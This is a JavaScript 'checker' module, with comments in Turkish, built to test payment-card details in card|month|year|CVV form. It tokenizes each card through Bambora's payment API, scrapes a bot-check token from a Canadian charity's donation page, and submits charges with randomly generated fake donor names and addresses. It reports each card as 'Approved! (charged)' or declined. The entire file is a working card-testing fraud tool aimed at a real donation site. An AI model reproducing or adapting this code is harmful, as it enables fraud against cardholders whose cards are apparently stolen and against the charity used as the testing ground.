(function() {
    'use strict';

    window.BamboraAuth = {
        formatCC: function(line) {
            try {
                const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
                if (parts.length < 4) return null;
                let cc = parts[0].replace(/\D/g, '');
                let mm = parts[1].replace(/\D/g, '');
                let yy = parts[2].replace(/\D/g, '');
                let cvv = parts[3].replace(/\D/g, '');
                if (mm.length === 1) mm = '0' + mm;
                else if (mm.length > 2) mm = mm.slice(-2);
                if (yy.length === 4) yy = yy.slice(-2);
                return { cc, mm, yy, cvv };
            } catch (e) { return null; }
        },

        getCardType: function(card) {
            const first = card.charAt(0);
            if (first === '4') return 'Visa';
            if (first === '5') return 'MasterCard';
            if (card.startsWith('34') || card.startsWith('37')) return 'Amex';
            if (first === '6') return 'Discover';
            return 'Visa';
        },

        generateRandomData: function() {
            const names = ['Ahmet', 'Mehmet', 'Ali', 'Ayse', 'Fatma', 'John', 'Jane', 'Michael', 'Sarah', 'David'];
            const surnames = ['Yilmaz', 'Demir', 'Kaya', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller'];
            const streets = ['Main St', 'Park Ave', 'Oak St', 'Maple St', 'Cedar St', 'Elm St', 'Lake St', 'Hill St'];
            const cities = ['Istanbul', 'Ankara', 'Izmir', 'New York', 'London', 'Paris', 'Berlin', 'Toronto'];
            const countries = ['TR', 'US', 'GB', 'DE', 'FR', 'CA'];

            const name = names[Math.floor(Math.random() * names.length)];
            const surname = surnames[Math.floor(Math.random() * surnames.length)];
            const street = streets[Math.floor(Math.random() * streets.length)] + ' ' + (Math.floor(Math.random() * 999) + 1);
            const city = cities[Math.floor(Math.random() * cities.length)];
            const country = countries[Math.floor(Math.random() * countries.length)];
            const postal = Math.floor(Math.random() * 90000) + 10000;
            const email = name.toLowerCase() + '.' + surname.toLowerCase() + Math.floor(Math.random() * 100) + '@gmail.com';

            return {
                card_name: name + ' ' + surname,
                first_name: name,
                last_name: surname,
                email: email,
                street: street,
                city: city,
                country: country,
                postal: postal.toString()
            };
        },

        check: async function(cc, mm, yy, cvv, amount) {
            try {
                const cardType = this.getCardType(cc);
                const yearFull = '20' + yy;
                const randomData = this.generateRandomData();

                // 1. Token al
                const bamboraHeaders = {
                    'Accept': '*/*',
                    'Content-Type': 'text/plain; charset=UTF-8',
                    'Origin': 'https://libs.na.bambora.com',
                    'Referer': 'https://libs.na.bambora.com/',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
                };
                const tokenData = JSON.stringify({
                    number: cc,
                    expiry_month: mm,
                    expiry_year: yearFull,
                    cvd: cvv
                });
                const tokenResp = await fetch('https://api.na.bambora.com/scripts/tokenization/tokens', {
                    method: 'POST',
                    headers: bamboraHeaders,
                    body: tokenData
                });
                const tokenJson = await tokenResp.json();
                const token = tokenJson.token;
                if (!token) return 'Declined! (token error)';

                // 2. Bot check al
                const session = await fetch('https://donate.kinvia.ca/single.php', {
                    method: 'GET',
                    headers: { 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36' }
                });
                const html = await session.text();
                const botCheckMatch = html.match(/name="bot_check"\s+value="([^"]*)"/);
                const botCheck = botCheckMatch ? botCheckMatch[1] : '';

                // 3. Ödeme isteği
                const postData = new URLSearchParams();
                postData.append('amount', amount);
                postData.append('donor_type', 'Personal');
                postData.append('company', '');
                postData.append('honour', '');
                postData.append('supportDedication', '');
                postData.append('supportDedicationName', '');
                postData.append('supportCardName_first', '');
                postData.append('supportCardName_last', '');
                postData.append('supportCardStreetAddr', '');
                postData.append('supportCardCity', '');
                postData.append('supportCardPostalCode', '');
                postData.append('supportCardCountry', 'Canada');
                postData.append('supportCardCadProv', '');
                postData.append('supportCardUsState', '');
                postData.append('supportCardMessage', '');
                postData.append('supportDesignation', 'Greatest Need');
                postData.append('specificCampaign', '');
                postData.append('card_name', randomData.card_name);
                postData.append('FirstName', randomData.first_name);
                postData.append('LastName', randomData.last_name);
                postData.append('Email', randomData.email);
                postData.append('primaryPhone', '');
                postData.append('address_lookup', '');
                postData.append('StreetAddr', randomData.street);
                postData.append('City', randomData.city);
                postData.append('PostalCode', randomData.postal);
                postData.append('country', randomData.country);
                postData.append('CadProv', '');
                postData.append('UsState', '');
                postData.append('act', 'pay');
                postData.append('province', '');
                postData.append('supportCardProvince', '');
                postData.append('CreditCardType', cardType);
                postData.append('token', token);
                postData.append('GACampaign', 'not set');
                postData.append('GASource', 'direct');
                postData.append('GAMedium', 'direct');
                postData.append('lang_pref', 'undefined');
                postData.append('bot_check', botCheck);
                postData.append('language', 'e');
                postData.append('source_form', '');

                const headersPost = {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://donate.kinvia.ca',
                    'Referer': 'https://donate.kinvia.ca/single.php'
                };
                const resp = await fetch('https://donate.kinvia.ca/donate.php', {
                    method: 'POST',
                    headers: headersPost,
                    body: postData
                });
                const respText = await resp.text();

                // Sonuç kontrolü
                if (respText.includes('TRANSACTION UNSUCCESSFUL') || respText.includes('Oh no!')) {
                    return 'Declined! (transaction unsuccessful)';
                } else if (respText.includes('Thank you') || respText.includes('success')) {
                    return 'Approved! (charged)';
                } else {
                    return 'Declined! (unknown response)';
                }
            } catch (err) {
                return 'Error: ' + err.message.slice(0, 50);
            }
        }
    };
})();
